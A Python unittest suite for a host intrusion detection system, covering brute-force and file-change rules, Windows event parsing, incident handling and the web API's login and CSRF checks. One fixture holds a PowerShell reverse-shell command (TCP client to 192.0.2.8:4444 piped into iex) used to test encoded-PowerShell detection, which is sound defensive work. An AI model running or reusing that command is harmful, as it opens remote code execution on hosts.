import base64
import json
import platform
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from rt_hid.host.agent import HostAgent
from rt_hid.host.collectors.linux import LinuxFileIntegrityCollector
from rt_hid.host.collectors.windows import WindowsEventLogCollector, parse_security_event
from rt_hid.host.config import HostConfig
from rt_hid.host.detection.engine import HostDetectionEngine
from rt_hid.host.models import CollectorStatus, HostEvent
from rt_hid.host.platform import PlatformCapabilities
from rt_hid.host.storage import HostDatabase


class HostHidsTests(unittest.TestCase):
    def login(self, client) -> dict[str, str]:
        response = client.get("/login")
        self.assertEqual(response.status_code, 200)
        with client.session_transaction() as browser_session:
            token = browser_session["csrf_token"]
        response = client.post("/login", data={"username": "admin", "password": "example-local-admin-password", "csrf_token": token})
        self.assertEqual(response.status_code, 302)
        csrf = client.get("/api/session").get_json()["csrf_token"]
        return {"X-CSRF-Token": csrf}

    def test_event_validation_and_json_safe_evidence(self) -> None:
        event = HostEvent.create("host-1", "auth", "fixture", action="ssh_login", outcome="failure", evidence={"attempt": 1})
        self.assertEqual(event.event_type, "auth")
        self.assertEqual(event.to_dict()["host_id"], "host-1")
        with self.assertRaises(ValueError):
            HostEvent.create("host-1", "not-real", "fixture")

    def test_auth_rule_requires_threshold(self) -> None:
        config = HostConfig(host_id="host-1", auth_failure_threshold=3)
        engine = HostDetectionEngine(config)
        detections = []
        for index in range(3):
            detections.extend(engine.evaluate(HostEvent.create(
                "host-1", "auth", "fixture", timestamp=f"2026-01-01T00:00:0{index}+00:00",
                action="ssh_login", outcome="failure", source_ip="192.0.2.10", username="root",
            )))
        self.assertEqual(len(detections), 1)
        self.assertEqual(detections[0].rule_id, "HIDS-AUTH-001")
        self.assertEqual(detections[0].technique_id, "T1110")

    def test_sqlite_persists_events_detections_and_status(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            database = HostDatabase(Path(directory) / "host.sqlite3")
            event = HostEvent.create("host-1", "system_snapshot", "fixture")
            self.assertTrue(database.save_event(event))
            self.assertFalse(database.save_event(event))
            status = CollectorStatus("collector", "linux", True, True)
            database.save_collector_status(status)
            database.set_checkpoint("cursor", "12")
            self.assertEqual(database.get_checkpoint("cursor"), "12")
            database.close()
            reopened = HostDatabase(Path(directory) / "host.sqlite3")
            self.assertEqual(reopened.get_checkpoint("cursor"), "12")
            reopened.close()

    def test_undo_survives_database_restart(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "host.sqlite3"
            database = HostDatabase(path)
            database.save_incident({"incident_id": "incident-1", "state": "new",
                                    "first_seen": "2026-01-01T00:00:00+00:00",
                                    "last_seen": "2026-01-01T00:00:00+00:00"})
            database.save_alert({"alert_id": "alert-1", "incident_id": "incident-1",
                                 "first_seen": "2026-01-01T00:00:00+00:00",
                                 "last_seen": "2026-01-01T00:00:00+00:00",
                                 "severity": "medium", "status": "new"})
            database.set_incident_state("incident-1", "resolved")
            database.set_alert_status("alert-1", "false_positive")
            database.close()
            reopened = HostDatabase(path)
            try:
                self.assertEqual(reopened.undo_incident_state("incident-1"), "new")
                self.assertEqual(reopened.undo_alert_status("alert-1"), "new")
                self.assertEqual(reopened.get_incident("incident-1")["state"], "new")
            finally:
                reopened.close()

    def test_file_integrity_baseline_then_change(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "sensitive.conf"
            path.write_text("safe")
            database = HostDatabase(Path(directory) / "host.sqlite3")
            events = []
            config = HostConfig(host_id="host-1", monitored_paths=[path])
            try:
                collector = LinuxFileIntegrityCollector("host-1", config, database, events.append)
                self.assertEqual(collector.run_once(), [])
                path.write_text("changed")
                changed = collector.run_once()
                self.assertEqual(len(changed), 1)
                self.assertEqual(changed[0].event_type, "file_change")
                self.assertEqual(changed[0].action, "modify")
                path.unlink()
                deleted = collector.run_once()
                self.assertEqual(len(deleted), 1)
                self.assertEqual(deleted[0].action, "delete")
            finally:
                database.close()

    def test_windows_event_log_degrades_off_platform(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            database = HostDatabase(Path(directory) / "host.sqlite3")
            try:
                collector = WindowsEventLogCollector("host-1", database, lambda _event: None)
                if platform.system().lower() != "windows":
                    self.assertEqual(collector.run_once(), [])
                    self.assertFalse(collector.status.available)
            finally:
                database.close()

    def test_windows_failed_logon_and_security_change(self) -> None:
        def xml(event_id: int, record_id: int, fields: str = "") -> str:
            return ("<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
                    f"<System><EventID>{event_id}</EventID><EventRecordID>{record_id}</EventRecordID>"
                    "<TimeCreated SystemTime='2026-01-01T00:00:00Z'/></System>"
                    f"<EventData>{fields}</EventData></Event>")

        parsed = parse_security_event(xml(4625, 7, "<Data Name='TargetUserName'>admin</Data>"
                                          "<Data Name='IpAddress'>192.0.2.10</Data>"
                                          "<Data Name='LogonType'>10</Data>"), "host-1")
        self.assertIsNotNone(parsed)
        self.assertEqual(parsed[1].action, "remote_login")
        self.assertEqual(parsed[1].event_id, "windows-security-7-2026-01-01T00:00:00Z")
        engine = HostDetectionEngine(HostConfig(host_id="host-1", auth_failure_threshold=2))
        self.assertEqual(engine.evaluate(parsed[1]), [])
        parsed2 = parse_security_event(xml(4625, 8, "<Data Name='IpAddress'>192.0.2.10</Data>"
                                           "<Data Name='LogonType'>10</Data>"), "host-1")
        self.assertEqual(engine.evaluate(parsed2[1])[0].category, "brute_force")
        cleared = parse_security_event(xml(1102, 9), "host-1")
        self.assertEqual(engine.evaluate(cleared[1])[0].rule_id, "HIDS-SEC-001")

    def test_cross_platform_host_rules(self) -> None:
        engine = HostDetectionEngine(HostConfig(host_id="host-1", auth_failure_threshold=2))
        for index in range(2):
            event = HostEvent.create("host-1", "auth", "fixture", action="remote_login",
                                     outcome="failure", source_ip="192.0.2.8",
                                     timestamp=f"2026-01-01T00:00:0{index}+00:00")
            detections = engine.evaluate(event)
        self.assertEqual(detections[0].category, "brute_force")
        success = HostEvent.create("host-1", "auth", "fixture", action="remote_login",
                                   outcome="success", source_ip="192.0.2.8",
                                   timestamp="2026-01-01T00:00:02+00:00")
        self.assertEqual(engine.evaluate(success)[0].rule_id, "HIDS-AUTH-003")
        process = HostEvent.create("host-1", "process_start", "fixture",
                                   executable_path=r"C:\Users\Alice\AppData\Local\Temp\malware.exe")
        self.assertEqual(engine.evaluate(process)[0].rule_id, "HIDS-EXEC-001")

    def test_encoded_powershell_detection_and_incident(self) -> None:
        command = '$c=New-Object System.Net.Sockets.TCPClient("192.0.2.8",4444); iex $c.GetStream()'
        encoded = base64.b64encode(command.encode("utf-16-le")).decode("ascii")
        with tempfile.TemporaryDirectory() as directory:
            agent = HostAgent(HostConfig(host_id="host-1", database_path=Path(directory) / "host.sqlite3",
                                         enabled_collectors=set()))
            try:
                event = HostEvent.create("host-1", "process_start", "fixture", process_id=77,
                                         process_name="powershell.exe",
                                         executable_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                                         metadata={"command_line": ["powershell.exe", "-e", encoded]})
                agent.ingest_event(event)
                alerts = agent.database.list_alerts()
                self.assertEqual(len(alerts), 1)
                self.assertEqual(alerts[0]["rule_id"], "HIDS-EXEC-002")
                self.assertEqual(alerts[0]["severity"], "high")
                self.assertTrue(alerts[0]["evidence"]["network_execution_pattern"])
                self.assertNotIn(encoded, json.dumps(alerts[0]))
                detail = agent.database.get_incident_detail(alerts[0]["incident_id"])
                self.assertEqual(detail["events"][0]["event_id"], event.event_id)
                second = HostEvent.create("host-1", "process_start", "fixture", process_id=78,
                                          process_name="powershell.exe", executable_path=event.executable_path,
                                          metadata={"command_line": ["powershell.exe", "-e", encoded]})
                agent.ingest_event(second)
                self.assertEqual(len(agent.database.list_alerts()), 2)
                self.assertEqual(len(agent.database.list_incidents()), 2)
            finally:
                agent.stop()

    def test_encoded_powershell_rule_limits_and_false_positives(self) -> None:
        engine = HostDetectionEngine(HostConfig(host_id="host-1"))

        def process(name: str, arguments: list[str]) -> HostEvent:
            return HostEvent.create("host-1", "process_start", "fixture", process_name=name,
                                    executable_path=f"C:/Windows/System32/{name}",
                                    metadata={"command_line": arguments})

        benign = base64.b64encode('Write-Output "hello"'.encode("utf-16-le")).decode("ascii")
        finding = engine.evaluate(process("powershell.exe", ["powershell.exe", "-EncodedCommand", benign]))
        self.assertEqual(len(finding), 1)
        self.assertEqual(finding[0].severity, "medium")
        self.assertFalse(finding[0].evidence["network_execution_pattern"])
        self.assertEqual(engine.evaluate(process("notepad.exe", ["notepad.exe", "-e", benign])), [])
        self.assertEqual(engine.evaluate(process("powershell.exe", ["powershell.exe", "-ExecutionPolicy", "Bypass"])), [])
        malformed = engine.evaluate(process("pwsh.exe", ["pwsh.exe", "-ec", "not-base64!"]))
        self.assertEqual(len(malformed), 1)
        self.assertEqual(malformed[0].severity, "medium")
        self.assertFalse(malformed[0].evidence["network_execution_pattern"])

    def test_windows_agent_has_host_collectors(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            config = HostConfig(host_id="host-1", database_path=Path(directory) / "host.sqlite3")
            capabilities = PlatformCapabilities("windows", "11", "AMD64", ())
            with patch("rt_hid.host.agent.detect_capabilities", return_value=capabilities):
                agent = HostAgent(config)
            try:
                self.assertEqual({collector.collector_id for collector in agent.collectors}, {
                    "windows_event_log", "windows_process", "windows_network",
                    "windows_file_integrity", "windows_system",
                })
            finally:
                agent.stop()

    def test_agent_reports_local_capabilities_and_api_reads_persisted_data(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            config = HostConfig(host_id="host-1", database_path=Path(directory) / "host.sqlite3", enabled_collectors={"system"})
            agent = HostAgent(config)
            try:
                self.assertIn(agent.capabilities.system, {"linux", "windows", "darwin", ""})
                agent.collect_once()
                from rt_hid.host.api import create_app
                agent.database.set_admin_password("example-local-admin-password")
                client = create_app(agent).test_client()
                self.assertEqual(client.get("/api/status").status_code, 401)
                self.login(client)
                response = client.get("/api/status")
                self.assertEqual(response.status_code, 200)
                self.assertEqual(response.get_json()["host_id"], "host-1")
            finally:
                agent.stop()

    def test_incident_detail_shows_affected_file_and_source_event(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            config = HostConfig(host_id="host-1", database_path=Path(directory) / "host.sqlite3",
                                enabled_collectors=set())
            agent = HostAgent(config)
            try:
                from rt_hid.host.api import create_app

                agent.database.set_admin_password("example-local-admin-password")

                for name in ("secret.conf", "other.conf"):
                    agent.ingest_event(HostEvent.create(
                        "host-1", "file_change", "fixture", file_path=f"/etc/{name}",
                        action="modify", outcome="observed",
                        evidence={"sha256": "test-hash"},
                    ))
                client = create_app(agent).test_client()
                self.assertEqual(client.get("/").status_code, 302)
                self.assertEqual(client.get("/api/overview").status_code, 401)
                headers = self.login(client)
                page = client.get("/api/incident-page?limit=1&offset=0").get_json()
                self.assertEqual(page["total"], 2)
                self.assertEqual(len(page["items"]), 1)
                filtered = client.get("/api/incident-page?q=secret.conf").get_json()
                self.assertEqual(filtered["total"], 1)
                incident_id = filtered["items"][0]["incident_id"]
                detail = client.get(f"/api/incidents/{incident_id}").get_json()
                self.assertEqual(detail["affected_files"], ["/etc/secret.conf"])
                self.assertEqual(len(detail["alerts"]), 1)
                self.assertEqual(len(detail["detections"]), 1)
                self.assertEqual(detail["events"][0]["file_path"], "/etc/secret.conf")
                self.assertEqual(detail["events"][0]["evidence"]["sha256"], "test-hash")
                self.assertEqual(client.get("/api/overview").get_json()["incidents"], 2)
                self.assertEqual(client.post(f"/api/incidents/{incident_id}/acknowledge").status_code, 403)
                self.assertEqual(client.post(f"/api/incidents/{incident_id}/acknowledge", headers=headers).status_code, 200)
                self.assertEqual(client.get("/api/incident-page?state=acknowledged").get_json()["total"], 1)
                self.assertEqual(client.post(f"/api/incidents/{incident_id}/notes", headers=headers,
                                             json={"body": "Checked the file owner"}).status_code, 201)
                self.assertEqual(client.get(f"/api/incidents/{incident_id}").get_json()["notes"][0]["body"],
                                 "Checked the file owner")
                alert_id = detail["alerts"][0]["alert_id"]
                self.assertEqual(client.post(f"/api/alerts/{alert_id}/false-positive", headers=headers).status_code, 200)
                self.assertEqual(client.get(f"/api/incidents/{incident_id}").get_json()["alerts"][0]["status"],
                                 "false_positive")
                self.assertEqual(client.post(f"/api/alerts/{alert_id}/undo-false-positive").status_code, 403)
                self.assertEqual(client.post(f"/api/alerts/{alert_id}/undo-false-positive", headers=headers).status_code, 200)
                self.assertEqual(client.get(f"/api/incidents/{incident_id}").get_json()["alerts"][0]["status"], "new")
                self.assertEqual(client.post(f"/api/alerts/{alert_id}/undo-false-positive", headers=headers).status_code, 409)
                self.assertEqual(client.post(f"/api/incidents/{incident_id}/resolve", headers=headers).status_code, 200)
                self.assertEqual(client.get("/api/incidents/" + incident_id).get_json()["incident"]["state"], "resolved")
                self.assertEqual(client.post(f"/api/incidents/{incident_id}/undo-state", headers=headers).get_json()["status"],
                                 "acknowledged")
                self.assertEqual(client.post(f"/api/incidents/{incident_id}/undo-state", headers=headers).get_json()["status"],
                                 "new")
                self.assertEqual(client.post(f"/api/incidents/{incident_id}/undo-state", headers=headers).status_code, 409)
                self.assertEqual(client.get("/api/incidents/missing").status_code, 404)
                self.assertIn(b"Investigation detail", client.get("/").data)
                agent.database.set_admin_password("another-local-admin-password")
                self.assertEqual(client.get("/api/status").status_code, 401)
            finally:
                agent.stop()

    def test_login_logout_and_password_rotation(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            config = HostConfig(host_id="host-1", database_path=Path(directory) / "host.sqlite3",
                                enabled_collectors=set())
            agent = HostAgent(config)
            try:
                from rt_hid.host.api import create_app

                with self.assertRaises(ValueError):
                    agent.database.set_admin_password("short")
                agent.database.set_admin_password("example-local-admin-password")
                client = create_app(agent).test_client()
                self.assertEqual(client.get("/").status_code, 302)
                self.assertEqual(client.get("/api/session").status_code, 401)
                self.assertEqual(client.post("/login", data={"password": "example-local-admin-password"}).status_code, 403)
                login_page = client.get("/login")
                self.assertIn("HttpOnly", login_page.headers.get("Set-Cookie", ""))
                self.assertIn("SameSite=Strict", login_page.headers.get("Set-Cookie", ""))
                with client.session_transaction() as browser_session:
                    token = browser_session["csrf_token"]
                wrong = client.post("/login", data={"password": "wrong", "csrf_token": token})
                self.assertEqual(wrong.status_code, 401)
                headers = self.login(client)
                self.assertEqual(client.get("/").status_code, 200)
                self.assertEqual(client.post("/logout").status_code, 403)
                self.assertEqual(client.post("/logout", headers=headers).status_code, 200)
                self.assertEqual(client.get("/api/status").status_code, 401)
                self.login(client)
                agent.database.set_admin_password("another-local-admin-password")
                self.assertEqual(client.get("/api/status").status_code, 401)
            finally:
                agent.stop()

    def test_default_login_requires_password_change(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            config = HostConfig(host_id="host-1", database_path=Path(directory) / "host.sqlite3",
                                enabled_collectors=set())
            agent = HostAgent(config)
            try:
                from rt_hid.host.api import create_app

                client = create_app(agent).test_client()
                self.assertEqual(client.get("/").status_code, 302)
                self.assertIn(b"admin", client.get("/login").data)
                with client.session_transaction() as browser_session:
                    token = browser_session["csrf_token"]
                self.assertEqual(client.post("/login", data={"username": "admin", "password": "wrong",
                                                             "csrf_token": token}).status_code, 401)
                response = client.post("/login", data={"username": "admin", "password": "admin",
                                                       "csrf_token": token})
                self.assertEqual(response.headers["Location"], "/change-password")
                self.assertEqual(client.get("/api/status").status_code, 403)
                self.assertEqual(client.get("/").headers["Location"], "/change-password")
                self.assertEqual(client.post("/change-password", data={"password": "a-new-local-password",
                                                                       "confirmation": "a-new-local-password"}).status_code, 403)
                with client.session_transaction() as browser_session:
                    token = browser_session["csrf_token"]
                self.assertEqual(client.post("/change-password", data={"password": "short",
                                                                       "confirmation": "short", "csrf_token": token}).status_code, 400)
                response = client.post("/change-password", data={"password": "a-new-local-password",
                                                                 "confirmation": "a-new-local-password",
                                                                 "csrf_token": token})
                self.assertEqual(response.headers["Location"], "/")
                self.assertEqual(client.get("/api/status").status_code, 200)
                self.assertTrue(agent.database.has_admin_password())
                self.assertFalse(agent.database.verify_admin_password("admin"))
                client.get("/login")
                self.assertEqual(client.get("/change-password").headers["Location"], "/login")
            finally:
                agent.stop()

    def test_config_json_round_trip(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "config.json"
            path.write_text(json.dumps({"host_id": "h", "database_path": str(Path(directory) / "db.sqlite3"), "enabled_collectors": ["system"]}))
            config = HostConfig.from_json(path)
            config.validate()
            self.assertEqual(config.host_id, "h")
            self.assertEqual(config.enabled_collectors, {"system"})


if __name__ == "__main__":
    unittest.main()
